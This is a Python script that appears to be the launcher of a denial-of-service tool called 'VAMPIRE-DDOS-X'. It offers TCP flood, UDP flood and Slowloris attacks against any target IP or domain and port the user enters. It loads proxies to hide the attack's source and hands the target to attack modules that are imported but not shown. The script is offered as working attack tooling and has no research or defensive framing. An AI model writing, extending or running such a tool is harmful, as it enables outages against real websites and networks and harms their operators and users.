#!/usr/bin/env python3

import os
import sys
import time
import random
import threading
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Password Protected Mode
PASSWORD = "SH404"

# Banner
def banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(Fore.RED + Style.BRIGHT + """
██╗   ██╗ █████╗ ███╗   ███╗██████╗ ██╗██████╗ ███████╗
██║   ██║██╔══██╗████╗ ████║██╔══██╗██║██╔══██╗██╔════╝
██║   ██║███████║██╔████╔██║██████╔╝██║██████╔╝█████╗  
██║   ██║██╔══██║██║╚██╔╝██║██╔═══╝ ██║██╔═══╝ ██╔══╝  
╚██████╔╝██║  ██║██║ ╚═╝ ██║██║     ██║██║     ███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚═╝     ╚══════╝
             [ VAMPIRE-DDOS-X ]        
    """)
    print(Fore.CYAN + "     Developed by: Muhammad Shourov (VAMPIRE)")
    print(Fore.YELLOW + "     Team: Vampire Squad | GitHub: vampiresquad\n")

# Load proxies if available
def load_proxies():
    proxies = []
    if os.path.exists("proxies.txt"):
        with open("proxies.txt", "r") as file:
            proxies = [line.strip() for line in file if line.strip()]
    return proxies

# Module runner
def run_attack(module_name, target, port, threads, proxies):
    try:
        attack_module = __import__(f"attacks.{module_name}", fromlist=["start_attack"])
        attack_module.start_attack(target, port, threads, proxies)
    except Exception as e:
        print(Fore.RED + f"[!] Failed to run module '{module_name}': {e}")

# Menu
def menu():
    banner()
    print(Fore.GREEN + "[1] TCP Flood")
    print("[2] UDP Flood")
    print("[3] Slowloris")
    print("[4] Exit\n")
    choice = input(Fore.YELLOW + "[>] Choose method: ")

    if choice not in ["1", "2", "3"]:
        print(Fore.RED + "[!] Invalid Choice")
        return

    method_map = {
        "1": "tcp",
        "2": "udp",
        "3": "slowloris"
    }
    module = method_map[choice]
    target = input(Fore.CYAN + "[>] Enter Target IP/Domain: ").strip()
    port = int(input(Fore.CYAN + "[>] Enter Port (e.g., 80): ").strip())
    threads = int(input(Fore.CYAN + "[>] Threads (recommended 100+): ").strip())

    proxies = load_proxies()
    print(Fore.MAGENTA + f"[~] Loaded {len(proxies)} proxies" if proxies else "[!] No proxies loaded")

    print(Fore.GREEN + f"[✓] Launching {module.upper()} attack on {target}:{port} with {threads} threads...\n")
    time.sleep(2)

    # Launch attack
    run_attack(module, target, port, threads, proxies)

# Entry point
def main():
    banner()
    mode = input(Fore.YELLOW + "[?] Do you want to use Admin Mode? (y/n): ").strip().lower()
    if mode == "y":
        key = input(Fore.RED + "[>] Enter Admin Password: ").strip()
        if key != PASSWORD:
            print(Fore.RED + "[X] Incorrect Password!")
            sys.exit(1)
        print(Fore.GREEN + "[✓] Admin access granted.\n")
    menu()

if __name__ == "__main__":
    main()
